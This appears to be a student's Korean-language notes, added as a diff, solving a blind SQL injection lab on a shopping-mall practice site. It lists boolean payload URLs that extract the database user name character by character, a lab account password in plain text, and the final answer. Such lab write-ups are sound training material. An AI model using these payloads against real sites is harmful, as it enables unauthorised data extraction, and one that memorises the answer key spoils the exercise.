@@ -1,0 +1,34 @@
+쇼핑몰 계정
+song
+Songsong!@#
+
+쇼핑몰 1번
+1. 쿼리문 유추
+- https://elms2.skinfosec.co.kr:8110/practice/practice01/ ->상품목록 첫 페이지
+- https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 -> 상품 클릭 시 변하는 주소
+- https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and 10=9 -> 주소 뒤에 or 10=9 추가 시 웹페이지 변화 확인
+- SELECT id, name, price, description, details FROM products WHERE id = 62; -> 상품 클릭 시 상품의 id를 통해 상품의 상세 정보 조회
+- id는 숫자형 자료형 -> 공격 쿼리에 따옴표 추가를 잘 생각해야함
+
+2. 공격포인트
+- select id from '상품정보' where id = '상품의id' and ___공격 쿼리___
+https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and 참 -> 웹페이지 변화 x
+https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and (select length(user) from dual) > 0 -> 유저명의 길이가 0 보다 크므로 정상 출력 확인
+
+3. 유저명
+3-1. 유저명 글자수
+- (select length(user) from dual) < 길이 로 확인 -> select length(user) from dual) < 9 에서 정상 출력 -> 글자 수는 8
+3-2. 유저명 아스키 코드 대입
+-  (select ascii(substr(user, 1 ,1)) from dual) = 아스키코드 값으로 확인 -> 
+https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and (select ascii(substr(user, 1 ,1)) from dual) = 0
+- 인트루더로 8글자 확인
+글자 1 : 85 - U
+글자 2 : 83 - S
+글자 3 : 69 - E
+글자 4 : 87 - W
+글자 5 : 79 - O
+글자 6 : 82 - R
+글자 7 : 76 - L
+글자 8 : 68 - D
+4. 정답
+USEWORLD
